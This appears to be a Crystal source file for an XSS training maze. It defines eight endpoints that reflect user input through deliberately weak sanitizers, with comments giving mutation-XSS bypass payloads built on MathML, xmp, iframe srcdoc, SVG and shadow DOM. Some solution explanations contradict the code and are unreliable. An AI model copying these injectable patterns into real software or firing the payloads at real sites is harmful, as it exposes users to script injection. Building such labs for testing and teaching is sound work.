require "html"

# Advanced HTML5 Sanitizer Bypass Levels
# These scenarios replicate historic CVE-level sanitizer bypasses using complex browser parser behaviors
# such as MathML namespace switching and parser nested element quirks (e.g., xmp elements).

# ==============================================================================
# SOLUTION EXPLANATIONS FOR MATH/XML NAMESPACE SWITCHING
# ==============================================================================
#
# ## MathML Namespace Context Switching
#
# MathML (Mathematical Markup Language) is part of HTML5 and uses the MathML namespace.
# When browsers parse MathML elements, they enter a different parsing context that has
# different rules than standard HTML parsing. This creates opportunities for bypasses:
#
# 1. **Namespace Confusion**: Sanitizers may use HTML parsers that don't properly handle
#    namespace transitions. When content moves from HTML → MathML → HTML contexts,
#    the sanitizer's view may differ from the browser's final interpretation.
#
# 2. **XMP Element Quirk**: The <xmp> tag is a deprecated HTML element that renders its
#    content as raw text (similar to <plaintext>). However, within MathML context, browser
#    parsing behavior becomes ambiguous. Some browsers treat nested <xmp> differently in
#    foreign namespaces, allowing tags that would normally be escaped to survive.
#
# 3. **Iframe srcdoc Attribute**: The srcdoc attribute allows embedding entire HTML documents
#    within an iframe. When combined with namespace confusion, content that appears "safe"
#    in the sanitizer's HTML parse tree can become executable when the browser re-parses
#    it after namespace transitions.
#
# ## Historical Bypass Pattern (DOMPurify CVE-style)
#
# Pattern: <math><xmp><iframe srcdoc="<img src=x onerror=alert(1)>"></xmp></math>
#
# How it works:
# - Sanitizer sees: MathML context with xmp (text-only) containing "safe" text
# - Browser parses: Exits MathML → enters xmp → but xmp handling in MathML is quirky →
#   the </xmp> closes it → browser re-interprets the iframe srcdoc in HTML context →
#   the srcdoc content executes as HTML
#
# This is a "mutation XSS" or "mXSS" variant where sanitization and browser parsing differ.
#
# ## Defense Strategies
#
# - Use namespace-aware parsers (like DOMParser with proper MIME types)
# - Sanitize AFTER namespace normalization, not before
# - Remove or sanitize srcdoc attributes specifically
# - Consider blocking MathML entirely if not needed for application functionality
# - Use modern sanitizers like DOMPurify with proper configuration and keep them updated
#
# ==============================================================================

# Level 1: Mock HTML sanitizer that strips standard dangerous tags but leaves MathML/XML structures
# This simulates a naive sanitizer that only blacklists common XSS vectors
Xssmaze.push(
  "html5-sanitizer-level1",
  "/html5-sanitizer/level1/?query=a",
  "Mock sanitizer: strips <script>/<iframe>/<object> but allows MathML structures",
  vuln: "reflected-html", delivery: ["query"], note: "server reflects raw into a <div>; the tag/event blacklist misses MathML namespace vectors")
maze_get "/html5-sanitizer/level1/" do |env|
  query = env.params.query["query"]

  # Naive sanitizer: only strips dangerous HTML tags, doesn't understand namespaces
  sanitized = query
    .gsub(/<script[^>]*>.*?<\/script>/im, "")                # Remove script tags
    .gsub(/<iframe(?![^>]*srcdoc)[^>]*>.*?<\/iframe>/im, "") # Remove plain iframes (but misses srcdoc check)
    .gsub(/<object[^>]*>.*?<\/object>/im, "")                # Remove object tags
    .gsub(/on\w+\s*=/i, "")                                  # Remove event handlers

  # The sanitizer leaves MathML and XML tags untouched (mistake!)
  # Solution: Use MathML namespace context to bypass
  # Payload: <math><mtext><img src=x onerror=alert(1)></mtext></math>

  "<html><body>
  <h1>HTML5 Sanitizer Level 1</h1>
  <p>This sanitizer removes dangerous HTML tags but doesn't understand namespace contexts.</p>
  <div>#{sanitized}</div>
  </body></html>"
end

# Level 2: The classic math/xmp/iframe srcdoc parser differential bypass
# This is the core deliverable from the issue: the historic DOMPurify-style bypass
Xssmaze.push(
  "html5-sanitizer-level2",
  "/html5-sanitizer/level2/?query=a",
  "Parser differential: <math><xmp><iframe srcdoc=...></xmp></math> namespace confusion",
  vuln: "reflected-html", delivery: ["query"], note: "reflected raw into a <div>; the recursive script/event/js: filters miss the math/xmp/iframe-srcdoc parser differential")
maze_get "/html5-sanitizer/level2/" do |env|
  query = env.params.query["query"]

  # More sophisticated sanitizer: removes dangerous tags AND their content recursively
  # But still doesn't handle namespace switching properly
  sanitized = query

  # Strip script tags
  sanitized = Filters.strip_keyword_recursive(sanitized, "script")

  # Strip dangerous event handlers
  sanitized = Filters.strip_event_handlers(sanitized)

  # Strip javascript: protocol
  sanitized = Filters.strip_js_protocol(sanitized)

  # The sanitizer sees MathML → xmp (text mode) → text content "safe"
  # But browser parsing creates: MathML → xmp closes → iframe srcdoc → HTML re-parse → XSS!

  # Solution payload:
  # <math><xmp><iframe srcdoc="<img src=x onerror=alert(1)>"></xmp></math>
  #
  # Why it works:
  # 1. Sanitizer parses in HTML mode, sees MathML context
  # 2. Inside MathML, <xmp> is treated as foreign element (not special)
  # 3. Sanitizer thinks everything inside xmp is text
  # 4. Browser re-parses: MathML parsing → xmp handling varies → iframe srcdoc gets parsed as HTML
  # 5. The srcdoc attribute contains executable HTML that wasn't sanitized

  "<html><body>
  <h1>HTML5 Sanitizer Level 2 - Parser Differential</h1>
  <p>This demonstrates the classic MathML/XMP/iframe srcdoc namespace confusion bypass.</p>
  <p><strong>Hint:</strong> The sanitizer and browser parse namespaces differently.</p>
  <div>#{sanitized}</div>
  </body></html>"
end

# Level 3: MathML annotation-xml with srcdoc bypass
# Uses annotation-xml which explicitly allows HTML content in MathML context
Xssmaze.push(
  "html5-sanitizer-level3",
  "/html5-sanitizer/level3/?query=a",
  "MathML annotation-xml encoding=text/html with iframe srcdoc bypass",
  vuln: "reflected-html", delivery: ["query"], note: "reflected raw into a <div>; iframe is stripped in HTML context but annotation-xml switches to HTML parsing")
maze_get "/html5-sanitizer/level3/" do |env|
  query = env.params.query["query"]

  # Sanitizer strips iframe but doesn't check inside MathML annotation-xml
  sanitized = Filters.strip_tags(query, ["iframe", "script", "object"])
  sanitized = Filters.strip_event_handlers(sanitized)

  # Solution: <math><annotation-xml encoding="text/html"><iframe srcdoc="<img src=x onerror=alert(1)>"></annotation-xml></math>
  # The annotation-xml with encoding="text/html" explicitly switches to HTML parsing mode
  # Sanitizers that strip <iframe> in HTML context might miss it in MathML context

  "<html><body>
  <h1>HTML5 Sanitizer Level 3 - annotation-xml Context</h1>
  <p>The annotation-xml element can contain HTML, creating a namespace switch point.</p>
  <div>#{sanitized}</div>
  </body></html>"
end

# Level 4: Nested template and MathML for double namespace confusion
Xssmaze.push(
  "html5-sanitizer-level4",
  "/html5-sanitizer/level4/?query=a",
  "Template + MathML double namespace confusion with srcdoc",
  vuln: "reflected-js", sinks: ["innerHTML"], delivery: ["query"], note: "reflected raw into a backtick template literal, then assigned to innerHTML; break out with a backtick or use ${...}")
maze_get "/html5-sanitizer/level4/" do |env|
  query = env.params.query["query"]

  # Sanitizer that handles single-level namespace but not nested namespaces
  sanitized = Filters.strip_tags(query, ["script"])
  sanitized = sanitized.gsub(/on\w+\s*=/i, "")

  # Solution: <template><math><xmp><iframe srcdoc="<svg/onload=alert(1)>"></xmp></math></template>
  # Template creates its own document fragment context, then MathML adds another layer
  # When the content is moved from template → document, namespace confusion can occur
  # The iframe srcdoc then gets parsed in HTML context with SVG namespace

  "<html><body>
  <h1>HTML5 Sanitizer Level 4 - Template + MathML</h1>
  <p>Nested namespace contexts: Template → MathML → XMP → iframe srcdoc</p>
  <div id='output'></div>
  <script>
    var content = `#{sanitized}`;
    document.getElementById('output').innerHTML = content;
  </script>
  </body></html>"
end

# Level 5: SVG foreignObject combined with MathML and srcdoc
Xssmaze.push(
  "html5-sanitizer-level5",
  "/html5-sanitizer/level5/?query=a",
  "SVG foreignObject + MathML namespace chain with srcdoc bypass",
  vuln: "reflected-html", delivery: ["query"], note: "reflected raw into a <div>; script/js: filters miss the SVG foreignObject to MathML namespace chain")
maze_get "/html5-sanitizer/level5/" do |env|
  query = env.params.query["query"]

  # Sanitizer that strips script but doesn't understand SVG + MathML namespace chains
  sanitized = Filters.strip_keyword_recursive(query, "script")
  sanitized = sanitized.gsub(/javascript:/i, "")

  # Solution: <svg><foreignObject><math><xmp><iframe srcdoc="<img src=x onerror=alert(1)>"></xmp></math></foreignObject></svg>
  # SVG foreignObject allows embedding foreign content (like HTML/MathML)
  # This creates: SVG namespace → HTML namespace (via foreignObject) → MathML namespace → parsing quirk
  # The multi-layer namespace confusion makes it even harder for sanitizers to track

  "<html><body>
  <h1>HTML5 Sanitizer Level 5 - SVG foreignObject Chain</h1>
  <p>Complex namespace chain: SVG → foreignObject → MathML → XMP → srcdoc</p>
  <div>#{sanitized}</div>
  </body></html>"
end

# Level 6: Form element with srcdoc in MathML causing DOM clobbering + XSS
Xssmaze.push(
  "html5-sanitizer-level6",
  "/html5-sanitizer/level6/?query=a",
  "MathML with form element name collision + srcdoc XSS",
  vuln: "reflected-html", delivery: ["query"], note: "reflected raw into a <div>; leaves the MathML form-name-clobbering + iframe srcdoc vector")
maze_get "/html5-sanitizer/level6/" do |env|
  query = env.params.query["query"]

  # Sanitizer allows form elements but doesn't check for DOM clobbering in MathML context
  sanitized = Filters.strip_tags(query, ["script", "object"])
  sanitized = Filters.strip_js_protocol(sanitized)

  # Solution: <math><form name="document"><xmp><iframe srcdoc="<svg/onload=alert(document.domain)>"></xmp></form></math>
  # The form with name="document" can cause DOM clobbering
  # Combined with the MathML/xmp/srcdoc bypass, this can access clobbered properties
  # This demonstrates how namespace confusion can combine with other vulnerabilities

  "<html><body>
  <h1>HTML5 Sanitizer Level 6 - DOM Clobbering + Namespace</h1>
  <p>Combining DOM clobbering with namespace confusion for advanced bypass</p>
  <div>#{sanitized}</div>
  <script>
    // This script might be affected by DOM clobbering if form name='document' survives
    console.log('Document object type:', typeof document);
  </script>
  </body></html>"
end

# Level 7: Data URI in srcdoc with MathML base64 encoding bypass
Xssmaze.push(
  "html5-sanitizer-level7",
  "/html5-sanitizer/level7/?query=a",
  "MathML + srcdoc with data URI base64 encoding bypass",
  vuln: "reflected-html", delivery: ["query"], note: "reflected raw into a <div>; the single data:/script strip is bypassable with entity-encoded data: URIs")
maze_get "/html5-sanitizer/level7/" do |env|
  query = env.params.query["query"]

  # Sanitizer that strips data: protocol but doesn't check inside srcdoc in MathML
  sanitized = query.gsub(/data:/i, "")
  sanitized = Filters.strip_keyword_ci(sanitized, "script")

  # Solution: <math><xmp><iframe srcdoc="<iframe src='data:text/html,<svg/onload=alert(1)>'></iframe>"></xmp></math>
  # The outer sanitizer strips "data:" at the HTML level
  # But inside MathML → xmp → srcdoc, the data: URI might survive if sanitizer only does one pass
  # Or use: <math><xmp><iframe srcdoc='<iframe src="&#100;&#97;&#116;&#97;:text/html,<svg/onload=alert(1)>"></iframe>'></xmp></math>
  # HTML entity encoding of "data:" bypasses simple string matching

  "<html><body>
  <h1>HTML5 Sanitizer Level 7 - Encoded Data URI</h1>
  <p>Using encoding to bypass data: protocol filters in namespace-confused context</p>
  <div>#{sanitized}</div>
  </body></html>"
end

# Level 8: Shadow DOM slot with MathML and srcdoc
Xssmaze.push(
  "html5-sanitizer-level8",
  "/html5-sanitizer/level8/?query=a",
  "Shadow DOM slot + MathML namespace with srcdoc bypass",
  vuln: "reflected-html", delivery: ["query"], note: "reflected raw into a <div>; script/event filters miss the declarative-shadow-DOM template vector")
maze_get "/html5-sanitizer/level8/" do |env|
  query = env.params.query["query"]

  # Sanitizer doesn't understand Shadow DOM boundaries combined with MathML
  sanitized = Filters.strip_tags(query, ["script"])
  sanitized = Filters.strip_event_handlers(sanitized)

  # Solution: <div id="host"></div><math><xmp><iframe srcdoc="<template shadowrootmode=open><slot></slot><img src=x onerror=alert(1)></template>"></xmp></math>
  # Shadow DOM with declarative shadow root can isolate content
  # Combined with MathML namespace confusion, sanitizers may not traverse into shadow roots
  # The srcdoc creates a new document context that gets parsed with the shadow DOM

  "<html><body>
  <h1>HTML5 Sanitizer Level 8 - Shadow DOM + MathML</h1>
  <p>Shadow DOM boundaries combined with namespace confusion</p>
  <div id='target'>#{sanitized}</div>
  <script>
    // Shadow DOM might be created if payload contains template with shadowrootmode
  </script>
  </body></html>"
end
